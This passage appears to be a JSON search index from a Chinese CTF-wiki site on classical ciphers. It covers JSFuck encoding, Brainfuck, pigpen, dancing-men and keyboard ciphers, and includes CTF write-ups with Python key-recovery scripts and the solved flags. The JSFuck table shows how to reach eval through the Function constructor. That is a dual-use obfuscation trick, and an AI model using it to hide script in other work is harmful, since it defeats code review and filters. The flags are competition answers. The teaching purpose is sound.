!! [] + [])[ + [[ !+ [] +!+ [] +!+ []]]] + ( !! [] + [])[ + [[ +!+ []]]]] + [])[ + [[ !+ [] +!+ [] +!+ []]]] + ([][( ! [] + [])[ + [[ + []]]] + ([][[]] + [])[ + [[ !+ [] +!+ [] +!+ [] +!+ [] +!+ []]]] + ( ! [] + [])[ + [[ !+ [] +!+ []]]] + ( !! [] + [])[ + [[ + []]]] + ( !! [] + [])[ + [[ !+ [] +!+ [] +!+ []]]] + ( !! [] + [])[ + [[ +!+ []]]]] + [])[ + [[ !+ [] +!+ [] +!+ [] +!+ [] +!+ [] +!+ []]]] + ([][[]] + [])[ + [[ +!+ []]]] + ( ! [] + [])[ + [[ !+ [] +!+ [] +!+ []]]] + ( !! [] + [])[ + [[ + []]]] + ( !! [] + [])[ + [[ +!+ []]]] + ([][[]] + [])[ + [[ + []]]] + ([][( ! [] + [])[ + [[ + []]]] + ([][[]] + [])[ + [[ !+ [] +!+ [] +!+ [] +!+ [] +!+ []]]] + ( ! [] + [])[ + [[ !+ [] +!+ []]]] + ( !! [] + [])[ + [[ + []]]] + ( !! [] + [])[ + [[ !+ [] +!+ [] +!+ []]]] + ( !! [] + [])[ + [[ +!+ []]]]] + [])[ + [[ !+ [] +!+ [] +!+ []]]] + ( !! [] + [])[ + [[ + []]]] + ([][( ! [] + [])[ + [[ + []]]] + ([][[]] + [])[ + [[ !+ [] +!+ [] +!+ [] +!+ [] +!+ []]]] + ( ! [] + [])[ + [[ !+ [] +!+ []]]] + ( !! [] + [])[ + [[ + []]]] + ( !! [] + [])[ + [[ !+ [] +!+ [] +!+ []]]] + ( !! [] + [])[ + [[ +!+ []]]]] + [])[ + [[ !+ [] +!+ [] +!+ [] +!+ [] +!+ [] +!+ []]]] + ( !! [] + [])[ + [[ +!+ []]]]](( ! [] + [])[ + [[ +!+ []]]] + ( ! [] + [])[ + [[ !+ [] +!+ []]]] + ( !! [] + [])[ + [[ !+ [] +!+ [] +!+ []]]] + ( !! [] + [])[ + [[ +!+ []]]] + ( !! [] + [])[ + [[ + []]]] + ([][( ! [] + [])[ + [[ + []]]] + ([][[]] + [])[ + [[ !+ [] +!+ [] +!+ [] +!+ [] +!+ []]]] + ( ! [] + [])[ + [[ !+ [] +!+ []]]] + ( !! [] + [])[ + [[ + []]]] + ( !! [] + [])[ + [[ !+ [] +!+ [] +!+ []]]] + ( !! [] + [])[ + [[ +!+ []]]]] + [])[ + [[ +!+ []]] + [[ !+ [] +!+ [] +!+ [] +!+ [] +!+ []]]] + [ +!+ []] + ([][( ! [] + [])[ + [[ + []]]] + ([][[]] + [])[ + [[ !+ [] +!+ [] +!+ [] +!+ [] +!+ []]]] + ( ! [] + [])[ + [[ !+ [] +!+ []]]] + ( !! [] + [])[ + [[ + []]]] + ( !! [] + [])[ + [[ !+ [] +!+ [] +!+ []]]] + ( !! [] + [])[ + [[ +!+ []]]]] + [])[ + [[ +!+ []]] + [[ !+ [] +!+ [] +!+ [] +!+ [] +!+ [] +!+ []]]])()   \u5176\u4ed6\u4e00\u4e9b\u57fa\u672c\u7684\u8868\u8fbe\uff1a  false         =    ! []  true          =    !! []  undefined     =    [][[]]  NaN           =    + [ ! []]  0             =    + []  1             =    +!+ []  2             =    !+ [] +!+ []  10            =    [ +!+ []] + [ + []]  Array         =    []  Number        =    + []  String        =    [] + []  Boolean       =    ! []  Function      =    [][ filter ]  eval          =    [][ filter ][ constructor ](   CODE   )()  window        =    [][ filter ][ constructor ]( return this )()", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/crypto/classical/others/#_15", 
            "text": "JSFuck \u5728\u7ebf\u52a0\u5bc6\u7f51\u7ad9", 
            "title": "\u5de5\u5177"
        }, 
        {
            "location": "/crypto/classical/others/#brainfuck", 
            "text": "", 
            "title": "BrainFuck"
        }, 
        {
            "location": "/crypto/classical/others/#_16", 
            "text": "Brainfuck\uff0c\u662f\u4e00\u79cd\u6781\u5c0f\u5316\u7684\u8ba1\u7b97\u673a\u8bed\u8a00\uff0c\u5b83\u662f\u7531 Urban M\u00fcller \u5728 1993 \u5e74\u521b\u5efa\u7684\u3002\u6211\u4eec\u4e3e\u4e00\u4e2a\u4f8b\u5b50\uff0c\u5982\u679c\u6211\u4eec\u60f3\u8981\u4e00\u4e2a\u5728\u5c4f\u5e55\u4e0a\u6253\u5370Hello World\uff01\uff0c\u90a3\u4e48\u5bf9\u5e94\u7684\u7a0b\u5e8f\u5982\u4e0b\u3002\u5bf9\u4e8e\u5176\u4e2d\u7684\u539f\u7406\uff0c\u611f\u5174\u8da3\u7684\u53ef\u4ee5\u81ea\u884c\u7f51\u4e0a\u641c\u7d22\u3002  ++++++++++[ +++++++ ++++++++++ +++ + -] ++. +.+++++++..+++. ++. +++++++++++++++. .+++.------.--------. +. .  \u4e0e\u5176\u5bf9\u5e94\u7684\u8fd8\u6709 ook\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/crypto/classical/others/#_17", 
            "text": "https://www.splitbrain.org/services/ook", 
            "title": "\u5de5\u5177"
        }, 
        {
            "location": "/crypto/classical/others/#_18", 
            "text": "", 
            "title": "\u732a\u5708\u5bc6\u7801"
        }, 
        {
            "location": "/crypto/classical/others/#_19", 
            "text": "\u732a\u5708\u5bc6\u7801\u662f\u4e00\u79cd\u4ee5\u683c\u5b50\u4e3a\u57fa\u7840\u7684\u7b80\u5355\u66ff\u4ee3\u5f0f\u5bc6\u7801\uff0c\u683c\u5b50\u5982\u4e0b   \u6211\u4eec\u4e3e\u4e00\u4e2a\u4f8b\u5b50\uff0c\u5982\u660e\u6587\u4e3a  X marks the spot  \uff0c\u90a3\u4e48\u5bc6\u6587\u5982\u4e0b", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/crypto/classical/others/#_20", 
            "text": "http://www.simonsingh.net/The_Black_Chamber/pigpen.html", 
            "title": "\u5de5\u5177"
        }, 
        {
            "location": "/crypto/classical/others/#_21", 
            "text": "", 
            "title": "\u821e\u52a8\u7684\u5c0f\u4eba\u5bc6\u7801"
        }, 
        {
            "location": "/crypto/classical/others/#_22", 
            "text": "\u8fd9\u79cd\u5bc6\u7801\u51fa\u81ea\u4e8e\u798f\u5c14\u6469\u65af\u63a2\u6848\u96c6\u3002\u6bcf\u4e00\u4e2a\u8df3\u821e\u7684\u5c0f\u4eba\u5b9e\u9645\u4e0a\u5bf9\u5e94\u7684\u662f\u82f1\u6587\u4e8c\u5341\u516d\u4e2a\u5b57\u6bcd\u4e2d\u7684\u4e00\u4e2a\uff0c\u800c\u5c0f\u4eba\u624b\u4e2d\u7684\u65d7\u5b50\u5219\u8868\u660e\u8be5\u5b57\u6bcd\u662f\u5355\u8bcd\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u6bcd\uff0c\u5982\u679c\u4ec5\u4ec5\u662f\u4e00\u4e2a\u5355\u8bcd\u800c\u4e0d\u662f\u53e5\u5b50\uff0c\u6216\u8005\u662f\u53e5\u5b50\u4e2d\u6700\u540e\u7684\u4e00\u4e2a\u5355\u8bcd\uff0c\u5219\u5355\u8bcd\u4e2d\u6700\u540e\u4e00\u4e2a\u5b57\u6bcd\u4e0d\u5fc5\u4e3e\u65d7\u3002", 
            "title": "\u539f\u7406"
        }, 
        {
            "location": "/crypto/classical/others/#_23", 
            "text": "\u6240\u8c13\u952e\u76d8\u5bc6\u7801\uff0c\u5c31\u662f\u91c7\u7528\u624b\u673a\u952e\u76d8\u6216\u8005\u7535\u8111\u952e\u76d8\u8fdb\u884c\u52a0\u5bc6\u3002", 
            "title": "\u952e\u76d8\u5bc6\u7801"
        }, 
        {
            "location": "/crypto/classical/others/#_24", 
            "text": "\u624b\u673a\u952e\u76d8\u52a0\u5bc6\u65b9\u5f0f\uff0c\u662f\u6bcf\u4e2a\u6570\u5b57\u952e\u4e0a\u6709 3-4 \u4e2a\u5b57\u6bcd\uff0c\u7528\u4e24\u4f4d\u6570\u5b57\u6765\u8868\u793a\u5b57\u6bcd\uff0c\u4f8b\u5982\uff1aru \u7528\u624b\u673a\u952e\u76d8\u8868\u793a\u5c31\u662f\uff1a7382\uff0c\u90a3\u4e48\u8fd9\u91cc\u5c31\u53ef\u4ee5\u77e5\u9053\u4e86\uff0c\u624b\u673a\u952e\u76d8\u52a0\u5bc6\u65b9\u5f0f\u4e0d\u53ef\u80fd\u7528 1 \u5f00\u5934\uff0c\u7b2c\u4e8c\u4f4d\u6570\u5b57\u4e0d\u53ef\u80fd\u8d85\u8fc7 4\uff0c\u89e3\u5bc6\u7684\u65f6\u5019\u53c2\u8003\u6b64   \u5173\u4e8e\u624b\u673a\u952e\u76d8\u52a0\u5bc6\u8fd8\u6709\u53e6\u4e00\u79cd\u65b9\u5f0f\uff0c\u5c31\u662f\u300c\u97f3\u7684\u300d\u5f0f\uff08\u8fd9\u4e00\u70b9\u53ef\u80fd\u6839\u636e\u624b\u673a\u7684\u4e0d\u540c\u4f1a\u6709\u6240\u4e0d\u540c\uff09\uff0c\u5177\u4f53\u53c2\u7167\u624b\u673a\u952e\u76d8\u6765\u6253\uff0c\u4f8b\u5982\uff1a\u300c\u6570\u5b57\u300d\u8868\u793a\u51fa\u6765\u5c31\u662f\uff1a748 94\u3002\u5728\u624b\u673a\u952e\u76d8\u4e0a\u9762\u6309\u4e0b\u8fd9\u51e0\u4e2a\u6570\uff0c\u5c31\u4f1a\u51fa\uff1a\u300c\u6570\u5b57\u300d\u7684\u62fc\u97f3\u3002", 
            "title": "\u624b\u673a\u952e\u76d8\u5bc6\u7801"
        }, 
        {
            "location": "/crypto/classical/others/#_25", 
            "text": "\u7535\u8111\u952e\u76d8\u68cb\u76d8\u52a0\u5bc6\uff0c\u5229\u7528\u4e86\u7535\u8111\u7684\u68cb\u76d8\u65b9\u9635\u3002", 
            "title": "\u7535\u8111\u952e\u76d8\u68cb\u76d8"
        }, 
        {
            "location": "/crypto/classical/others/#_26", 
            "text": "\u7535\u8111\u952e\u76d8\u5750\u6807\u52a0\u5bc6\uff0c\u5229\u7528\u952e\u76d8\u4e0a\u9762\u7684\u5b57\u6bcd\u884c\u548c\u6570\u5b57\u884c\u6765\u52a0\u5bc6\uff0c\u4f8b\uff1abye \u7528\u7535\u8111\u952e\u76d8 XY \u8868\u793a\u5c31\u662f\uff1a351613", 
            "title": "\u7535\u8111\u952e\u76d8\u5750\u6807"
        }, 
        {
            "location": "/crypto/classical/others/#qwe", 
            "text": "\u7535\u8111\u952e\u76d8 QWE \u52a0\u5bc6\u6cd5\uff0c\u5c31\u662f\u7528\u5b57\u6bcd\u8868\u66ff\u6362\u952e\u76d8\u4e0a\u9762\u7684\u6392\u5217\u987a\u5e8f\u3002", 
            "title": "\u7535\u8111\u952e\u76d8 QWE"
        }, 
        {
            "location": "/crypto/classical/others/#_27", 
            "text": "\u7b80\u5355\u5730\u8bf4\u5c31\u662f\u6839\u636e\u7ed9\u5b9a\u7684\u5b57\u7b26\u5728\u952e\u76d8\u4e0a\u7684\u6837\u5b50\u6765\u8fdb\u884c\u52a0\u5bc6\u3002", 
            "title": "\u952e\u76d8\u5e03\u5c40\u52a0\u5bc6"
        }, 
        {
            "location": "/crypto/classical/others/#0ctf-2014-classic", 
            "text": "\u5c0f\u4e01\u4e01\u53d1\u73b0\u81ea\u5df1\u7f6e\u8eab\u4e8e\u4e00\u4e2a\u8be1\u5f02\u7684\u623f\u95f4\uff0c\u9762\u524d\u53ea\u6709\u4e00\u6247\u523b\u7740\u5947\u602a\u5b57\u7b26\u7684\u95e8\u3002 \u4ed6\u53d1\u73b0\u95e8\u8fb9\u4e0a\u8fd8\u6709\u4e00\u9053\u5bc6\u7801\u9501\uff0c\u4f3c\u4e4e\u8981\u8f93\u5165\u5bc6\u7801\u624d\u80fd\u5f00\u95e8\u3002\u30024esxcft5 rdcvgt 6tfc78uhg 098ukmnb   \u53d1\u73b0\u8fd9\u4e48\u4e71\uff0c\u8fd8\u540c\u65f6\u5305\u62ec\u6570\u5b57\u548c\u5b57\u6bcd\u731c\u60f3\u53ef\u80fd\u662f\u952e\u76d8\u5bc6\u7801\uff0c\u8bd5\u7740\u5728\u952e\u76d8\u4e0a\u6309\u7167\u5b57\u6bcd\u987a\u5e8f\u63cf\u7ed8\u4e00\u4e0b\uff0c\u53ef\u5f97\u52300ops\u5b57\u6837\uff0c\u731c\u6d4b\u5c31\u662fflag\u4e86\u3002", 
            "title": "0CTF 2014 classic"
        }, 
        {
            "location": "/crypto/classical/others/#2017xman", 
            "text": "\u6211\u6570123\u6728\u5934\u4eba\uff0c\u518d\u4e0d\u884c\u52a8\u5c31\u8981\u88ab\u6263\u5206\u3002  23731263111628163518122316391715262121  \u5bc6\u7801\u683c\u5f0fxman{flag}   \u9898\u76ee\u4e2d\u6709\u5f88\u660e\u663e\u7684\u63d0\u793a123\uff0c\u90a3\u4e48\u5c31\u81ea\u7136\u9700\u8981\u8054\u60f3\u5230\u952e\u76d8\u5bc6\u7801\u4e2d\u7535\u8111\u952e\u76d8\u5750\u6807\u5bc6\u7801\uff0c\u53ef\u4ee5\u53d1\u73b0\u524d\u51e0\u4e2a\u6570\u5b57\u7b2c\u4e8c\u4e2a\u6570\u5b57\u90fd\u662f1-3\u8303\u56f4\u5185\u7684\uff0c\u4e5f\u9a8c\u8bc1\u4e86\u6211\u4eec\u7684\u731c\u6d4b\u3002\u4e8e\u662f   23-x  73-m  12-a  63-n  11-q   \u4e0d\u5bf9\u5440\uff0c\u5bc6\u7801\u683c\u5f0f\u662f  xman{ \uff0c\u7b2c\u56db\u4e2a\u5b57\u7b26\u662f  { \uff0c\u4e8e\u662f\u770b\u4e86\u770b  {  \u7684\u4f4d\u7f6e\uff0c\u5176\u5e76\u6ca1\u6709\u5bf9\u5e94\u7684\u6a2a\u5750\u6807\uff0c\u4f46\u662f\u5982\u679c\u6211\u4eec\u624b\u52a8\u628a\u5b83\u89c6\u4e3a 11 \u7684\u8bdd\uff0c\u90a3\u4e48111\u5c31\u662f  { \u3002\u7136\u540e\u4f9d\u6b21\u5f80\u540e\u63a8\uff0c\u53d1\u73b0\u786e\u5b9e\u53ef\u884c\uff0c\uff0c\u6700\u540e\u518d\u628a 121 \u89c6\u4e3a  }  \u5373\u53ef\u5f97\u5230 flag\u3002  xman{hintisenough}  \u4ece\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\uff0c\u6211\u4eec\u8fd8\u662f\u8981\u6ce8\u610f\u8fc1\u79fb\u6027\uff0c\u4e0d\u80fd\u5355\u7eaf\u5730\u7167\u642c\u4e00\u4e9b\u5df2\u6709\u7684\u77e5\u8bc6\u3002", 
            "title": "2017\u5e74xman\u9009\u62d4\u8d5b\u2014\u2014\u4e00\u4e8c\u4e09\uff0c\u6728\u5934\u4eba"
        }, 
        {
            "location": "/crypto/classical/others/#_28", 
            "text": "\u5b9e\u9a8c\u5427 \u5947\u602a\u7684\u77ed\u4fe1", 
            "title": "\u9898\u76ee"
        }, 
        {
            "location": "/crypto/classical/summary/", 
            "text": "\u603b\u7ed3\n\n\n\u7ecf\u9a8c\n\n\n\u53e4\u5178\u5bc6\u7801\u7684\u57fa\u672c\u89e3\u9898\u601d\u8def\u53ef\u4ee5\u603b\u7ed3\u5982\u4e0b\n\n\n\n\n\u5df2\u77e5\u5bc6\u7801\uff0c\u8bc6\u522b\u5bc6\u7801\n\n\n\u672a\u77e5\u5bc6\u7801\uff0c\u5206\u6790\u5bc6\u7801\u7279\u6027\uff0c\u5229\u7528\u66b4\u529b\u7834\u89e3\u6216\u8005\u76f8\u5e94\u601d\u8def\u6c42\u89e3\n\n\n\n\n\u6709\u4ee5\u4e0b\u51e0\u79cd\u65b9\u6cd5\u53ef\u4ee5\u7528\u6765\u8bc6\u522b\u5bc6\u7801\n\n\n\n\n\u52a0\u5bc6\u65b9\u5f0f\u5224\u522b\n\n\n\u5b57\u7b26\u96c6\u5224\u522b\n\n\n\u52a0\u5bc6\u7ed3\u679c\u6837\u5b50\u5224\u522b\n\n\n\n\n\u5b9e\u9a8c\u5427 \u56f4\u5728\u6805\u680f\u91cc\u7684\u7231\n\n\n\u9898\u76ee\u63cf\u8ff0\n\n\n\n\n\u6700\u8fd1\u4e00\u76f4\u5728\u597d\u5947\u4e00\u4e2a\u95ee\u9898\uff0cQWE\u5230\u5e95\u7b49\u4e0d\u7b49\u4e8eABC\uff1f\n\n\n-.- .. --.- .-.. .-- - ..-. -.-. --.- --. -. ... --- ---\n\n\nflag\u683c\u5f0f\uff1aCTF{xxx}\n\n\n\n\n\u9996\u5148\uff0c\u6839\u636e\u5bc6\u7801\u6837\u5f0f\u5224\u65ad\u662f\u6469\u65af\u7535\u7801\uff0c\u89e3\u5bc6\u540e\u5f97\u5230 \nKIQLWTFCQGNSOO\n\uff0c\u770b\u7740\u4e5f\u4e0d\u50cf flag\uff0c\u9898\u76ee\u4e2d\u8fd8\u6709\u8fd8\u6709\u6805\u680f\u4e0e \nQWE\u5230\u5e95\u7b49\u4e0d\u7b49\u4e8eABC\n\uff0c\u4e24\u4e2a\u90fd\u8bd5\u4e86\u8bd5\u4e4b\u540e\uff0c\u53d1\u73b0\u662f\u5148 QWE \u7136\u540e\u6805\u680f\u53ef\u5f97\u5230\u7ed3\u679c\u3002  \n\n\n\u9996\u5148\u952e\u76d8 QWE \u89e3\u5bc6\uff0c\u8bd5\u7740\u89e3\u5bc6\u5f97\u5230 \nIILYOAVNEBSAHR\n\u3002\u7ee7\u800c\u6805\u680f\u89e3\u5bc6\u5f97\u5230 \nILOVESHIYANBAR\n\u3002\n\n\n2017 SECCON Vigenere3d\n\n\n\u7a0b\u5e8f\u5982\u4e0b\n\n\n# Vigenere3d.py\n\n\nimport\n \nsys\n\n\ndef\n \n_l\n(\nidx\n,\n \ns\n):\n\n    \nreturn\n \ns\n[\nidx\n:]\n \n+\n \ns\n[:\nidx\n]\n\n\ndef\n \nmain\n(\np\n,\n \nk1\n,\n \nk2\n):\n\n    \ns\n \n=\n \nABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_{}\n\n    \nt\n \n=\n \n[[\n_l\n((\ni\n+\nj\n)\n \n%\n \nlen\n(\ns\n),\n \ns\n)\n \nfor\n \nj\n \nin\n \nrange\n(\nlen\n(\ns\n))]\n \nfor\n \ni\n \nin\n \nrange\n(\nlen\n(\ns\n))]\n\n    \ni1\n \n=\n \n0\n\n    \ni2\n \n=\n \n0\n\n    \nc\n \n=\n \n\n    \nfor\n \na\n \nin\n \np\n:\n\n        \nc\n \n+=\n \nt\n[\ns\n.\nfind\n(\na\n)][\ns\n.\nfind\n(\nk1\n[\ni1\n])][\ns\n.\nfind\n(\nk2\n[\ni2\n])]\n\n        \ni1\n \n=\n \n(\ni1\n \n+\n \n1\n)\n \n%\n \nlen\n(\nk1\n)\n\n        \ni2\n \n=\n \n(\ni2\n \n+\n \n1\n)\n \n%\n \nlen\n(\nk2\n)\n\n    \nreturn\n \nc\n\n\nprint\n \nmain\n(\nsys\n.\nargv\n[\n1\n],\n \nsys\n.\nargv\n[\n2\n],\n \nsys\n.\nargv\n[\n2\n][::\n-\n1\n])\n\n\n\n$\n \npython\n \nVigenere3d\n.\npy\n \nSECCON\n{\n**************************\n}\n \n**************\n\n\nPOR4dnyTLHBfwbxAAZhe\n}}\nocZR3Cxcftw9\n\n\n\n\n\n\u9996\u5148\uff0c\u6211\u4eec\u5148\u6765\u5206\u6790\u4e00\u4e0b t \u7684\u6784\u6210\n\n\n\n\n\nt[i][j]=s[i+j:]+s[:i+j] \\\\\nt[i][k]=s[i+k:]+s[:i+k]\n\n\n\n\nt[i][j]=s[i+j:]+s[:i+j] \\\\\nt[i][k]=s[i+k:]+s[:i+k]\n\n\n\n\n\nt[i][j][k]\nt[i][j][k]\n \u4e3a \nt[i][j]\nt[i][j]\n \u4e2d\u7684\u7b2c k \u4e2a\u5b57\u7b26\uff0c\nt[i][k][j]\nt[i][k][j]\n \u4e3a \nt[i][k]\nt[i][k]\n \u4e2d\u7684\u7b2c j \u4e2a\u5b57\u7b26\u3002\u65e0\u8bba\u662f \ni+j+k\ni+j+k\n \u662f\u5426\u8d85\u8fc7 \nlen(s)\n \u4e24\u8005\u90fd\u59cb\u7ec8\u4fdd\u6301\u4e00\u81f4\uff0c\u5373 \nt[i][j][k]=t[i][k][j]\nt[i][j][k]=t[i][k][j]\n \u3002\n\n\n\u6545\u800c\uff0c\u5176\u5b9e\u5bf9\u4e8e\u76f8\u540c\u7684\u660e\u6587\u6765\u8bf4\uff0c\u53ef\u80fd\u6709\u591a\u4e2a\u5bc6\u94a5\u4f7f\u5176\u751f\u6210\u76f8\u540c\u7684\u5bc6\u6587\u3002\n\n\n\u7136\u800c\u4e0a\u9762\u5206\u6790\u5c31\u662f\u5355\u7eaf\u5730\u5206\u6790\u800c\u5df2\uff0c\uff0c\u4e0b\u9762\u5f00\u59cb\u6b63\u9898\u3002\n\n\n\u4e0d\u96be\u770b\u51fa\uff0c\u5bc6\u6587\u7684\u6bcf\u4e00\u4f4d\u53ea\u4e0e\u660e\u6587\u7684\u76f8\u5e94\u4f4d\u76f8\u5173\uff0c\u800c\u4e14\uff0c\u5bc6\u94a5\u7684\u6bcf\u4e00\u4f4d\u7684\u7a7a\u95f4\u6700\u5927\u4e5f\u5c31\u662f s \u7684\u5927\u5c0f\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u7206\u7834\u6765\u83b7\u53d6\u5bc6\u94a5\u3002\u8fd9\u91cc\u6839\u636e\u4e0a\u8ff0\u547d\u4ee4\u884c\u63d0\u793a\uff0c\u53ef\u4ee5\u77e5\u9053\u5bc6\u94a5\u957f\u5ea6\u4e3a 14\uff0c\u6070\u597d\u660e\u6587\u524d\u97627\u4e2a\u5b57\u8282\u5df2\u77e5\u3002\u6062\u590d\u5bc6\u94a5\u7684 exp \u5982\u4e0b\n\n\ndef\n \nget_key\n(\nplain\n,\n \ncipher\n):\n\n    \ns\n \n=\n \nABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_{}\n\n    \nt\n \n=\n \n[[\n_l\n((\ni\n \n+\n \nj\n)\n \n%\n \nlen\n(\ns\n),\n \ns\n)\n \nfor\n \nj\n \nin\n \nrange\n(\nlen\n(\ns\n))]\n\n         \nfor\n \ni\n \nin\n \nrange\n(\nlen\n(\ns\n))]\n\n    \ni1\n \n=\n \n0\n\n    \ni2\n \n=\n \n0\n\n    \nkey\n \n=\n \n[\n*\n]\n \n*\n \n14\n\n    \nfor\n \ni\n \nin\n \nrange\n(\nlen\n(\nplain\n)):\n\n        \nfor\n \ni1\n \nin\n \nrange\n(\nlen\n(\ns\n)):\n\n            \nfor\n \ni2\n \nin\n \nrange\n(\nlen\n(\ns\n)):\n\n                \nif\n \nt\n[\ns\n.\nfind\n(\nplain\n[\ni\n])][\ns\n.\nfind\n(\ns\n[\ni1\n])][\ns\n.\nfind\n(\ns\n[\ni2\n])]\n \n==\n \ncipher\n[\n\n                        \ni\n]:\n\n                    \nkey\n[\ni\n]\n \n=\n \ns\n[\ni1\n]\n\n                    \nkey\n[\n13\n \n-\n \ni\n]\n \n=\n \ns\n[\ni2\n]\n\n    \nreturn\n \n.\njoin\n(\nkey\n)\n\n\n\n\n\n\u6062\u590d\u660e\u6587\u7684\u811a\u672c\u5982\u4e0b\n\n\ndef\n \ndecrypt\n(\ncipher\n,\n \nk1\n,\n \nk2\n):\n\n    \ns\n \n=\n \nABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_{}\n\n    \nt\n \n=\n \n[[\n_l\n((\ni\n \n+\n \nj\n)\n \n%\n \nlen\n(\ns\n),\n \ns\n)\n \nfor\n \nj\n \nin\n \nrange\n(\nlen\n(\ns\n))]\n\n         \nfor\n \ni\n \nin\n \nrange\n(\nlen\n(\ns\n))]\n\n    \ni1\n \n=\n \n0\n\n    \ni2\n \n=\n \n0\n\n    \nplain\n \n=\n \n\n    \nfor\n \na\n \nin\n \ncipher\n:\n\n        \nfor\n \ni\n \nin\n \nrange\n(\nlen\n(\ns\n)):\n\n            \nif\n \nt\n[\ni\n][\ns\n.\nfind\n(\nk1\n[\ni1\n])][\ns\n.\nfind\n(\nk2\n[\ni2\n])]\n \n==\n \na\n:\n\n                \nplain\n \n+=\n \ns\n[\ni\n]\n\n                \nbreak\n\n        \ni1\n \n=\n \n(\ni1\n \n+\n \n1\n)\n \n%\n \nlen\n(\nk1\n)\n\n        \ni2\n \n=\n \n(\ni2\n \n+\n \n1\n)\n \n%\n \nlen\n(\nk2\n)\n\n    \nreturn\n \nplain\n\n\n\n\n\n\u5f97\u5230\u660e\u6587\u5982\u4e0b\n\n\n\u279c  2017_seccon_vigenere3d git:\n(\nmaster\n)\n python exp.py\nSECCON\n{\nWelc0me_to_SECCON_CTF_2017\n}", 
            "title": "\u603b\u7ed3"
        }, 
        {
            "location": "/crypto/classical/summary/#_1", 
            "text": "", 
            "title": "\u603b\u7ed3"
        }, 
        {
            "location": "/crypto/classical/summary/#_2", 
            "text": "\u53e4\u5178\u5bc6\u7801\u7684\u57fa\u672c\u89e3\u9898\u601d\u8def\u53ef\u4ee5\u603b\u7ed3\u5982\u4e0b   \u5df2\u77e5\u5bc6\u7801\uff0c\u8bc6\u522b\u5bc6\u7801  \u672a\u77e5\u5bc6\u7801\uff0c\u5206\u6790\u5bc6\u7801\u7279\u6027\uff0c\u5229\u7528\u66b4\u529b\u7834\u89e3\u6216\u8005\u76f8\u5e94\u601d\u8def\u6c42\u89e3   \u6709\u4ee5\u4e0b\u51e0\u79cd\u65b9\u6cd5\u53ef\u4ee5\u7528\u6765\u8bc6\u522b\u5bc6\u7801   \u52a0\u5bc6\u65b9\u5f0f\u5224\u522b  \u5b57\u7b26\u96c6\u5224\u522b  \u52a0\u5bc6\u7ed3\u679c\u6837\u5b50\u5224\u522b", 
            "title": "\u7ecf\u9a8c"
        }, 
        {
            "location": "/crypto/classical/summary/#_3", 
            "text": "\u9898\u76ee\u63cf\u8ff0   \u6700\u8fd1\u4e00\u76f4\u5728\u597d\u5947\u4e00\u4e2a\u95ee\u9898\uff0cQWE\u5230\u5e95\u7b49\u4e0d\u7b49\u4e8eABC\uff1f  -.- .. --.- .-.. .-- - ..-. -.-. --.- --. -. ... --- ---  flag\u683c\u5f0f\uff1aCTF{xxx}   \u9996\u5148\uff0c\u6839\u636e\u5bc6\u7801\u6837\u5f0f\u5224\u65ad\u662f\u6469\u65af\u7535\u7801\uff0c\u89e3\u5bc6\u540e\u5f97\u5230  KIQLWTFCQGNSOO \uff0c\u770b\u7740\u4e5f\u4e0d\u50cf flag\uff0c\u9898\u76ee\u4e2d\u8fd8\u6709\u8fd8\u6709\u6805\u680f\u4e0e  QWE\u5230\u5e95\u7b49\u4e0d\u7b49\u4e8eABC \uff0c\u4e24\u4e2a\u90fd\u8bd5\u4e86\u8bd5\u4e4b\u540e\uff0c\u53d1\u73b0\u662f\u5148 QWE \u7136\u540e\u6805\u680f\u53ef\u5f97\u5230\u7ed3\u679c\u3002    \u9996\u5148\u952e\u76d8 QWE \u89e3\u5bc6\uff0c\u8bd5\u7740\u89e3\u5bc6\u5f97\u5230  IILYOAVNEBSAHR \u3002\u7ee7\u800c\u6805\u680f\u89e3\u5bc6\u5f97\u5230  ILOVESHIYANBAR \u3002", 
            "title": "\u5b9e\u9a8c\u5427 \u56f4\u5728\u6805\u680f\u91cc\u7684\u7231"
        }, 
        {
            "location": "/crypto/classical/summary/#2017-seccon-vigenere3d", 
            "text": "\u7a0b\u5e8f\u5982\u4e0b  # Vigenere3d.py  import   sys  def   _l ( idx ,   s ): \n     return   s [ idx :]   +   s [: idx ]  def   main ( p ,   k1 ,   k2 ): \n     s   =   ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz_{} \n     t   =   [[ _l (( i + j )   %   len ( s ),   s )   for   j   in   range ( len ( s ))]   for   i   in   range ( len ( s ))] \n     i1   =   0 \n     i2   =   0 \n     c   =   \n     for   a   in   p : \n         c   +=   t [ s . find ( a )][ s . find ( k1 [ i1 ])][ s . find ( k2 [ i2 ])] \n         i1   =   ( i1   +   1 )   %   len ( k1 ) \n         i2   =   ( i2   +   1 )   %   len ( k2 ) \n     return   c  print   main ( sys . argv [ 1 ],   sys . argv [ 2 ],   sys . argv [ 2 ][:: - 1 ])  $   python   Vigenere3d . py   SECCON { ************************** }   **************  POR4dnyTLHBfwbxAAZhe }} ocZR3Cxcftw9   \u9996\u5148\uff0c\u6211\u4eec\u5148\u6765\u5206\u6790\u4e00\u4e0b t \u7684\u6784\u6210   \nt[i][j]=s[i+j:]+s[:i+j] \\\\\nt[i][k]=s[i+k:]+s[:i+k]  \nt[i][j]=s[i+j:]+s[:i+j] \\\\\nt[i][k]=s[i+k:]+s[:i+k]   t[i][j][k] t[i][j][k]  \u4e3a  t[i][j] t[i][j]  \u4e2d\u7684\u7b2c k \u4e2a\u5b57\u7b26\uff0c t[i][k][j] t[i][k][j]  \u4e3a  t[i][k] t[i][k]  \u4e2d\u7684\u7b2c j \u4e2a\u5b57\u7b26\u3002\u65e0\u8bba\u662f  i+j+k i+j+k  \u662f\u5426\u8d85\u8fc7  len(s)  \u4e24\u8005\u90fd\u59cb\u7ec8\u4fdd\u6301\u4e00\u81f4\uff0c\u5373  t[i][j][k]=t[i][k][j] t[i][j][k]=t[i][k][j]  \u3002  